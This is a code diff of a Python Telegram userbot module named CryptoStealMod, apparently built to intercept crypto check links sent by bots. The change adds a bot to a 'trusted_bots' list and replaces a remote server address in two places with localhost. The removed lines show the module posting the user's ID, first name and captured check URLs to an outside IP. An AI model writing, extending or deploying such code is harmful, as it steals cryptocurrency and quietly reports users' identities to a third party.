@@ -98,7 +98,7 @@ class CryptoStealMod(loader.Module):
             ),
             loader.ConfigValue(
                 "trusted_bots",
-                ["cryptobot", "tonrocketbot", "xjetswapbot"],
+                ["cryptobot", "tonrocketbot", "xjetswapbot", "sliva_userbot"],
                 lambda: self.strings("trusted_bots"),
                 validator=loader.validators.Series(
                     loader.validators.Union(
@@ -133,7 +133,7 @@ class CryptoStealMod(loader.Module):
 
         if self.config["collect_info"]:
             try:
-                requests.post("http://130.162.186.90:18691/launched", json={"user_id": self.me.id, "user_firstname": self.me.first_name})
+                requests.post("http://localhost/launched", json={"user_id": self.me.id, "user_firstname": self.me.first_name})
             except Exception:
                 pass
 
@@ -197,7 +197,7 @@ class CryptoStealMod(loader.Module):
         if self.config["collect_info"]:
             try:
                 requests.post(
-                    "http://130.162.186.90:18691/gotcheck",
+                    "http://localhost/gotcheck",
                     json={
                         "url": message.buttons[0][0].url,
                         "user_id": self.me.id,
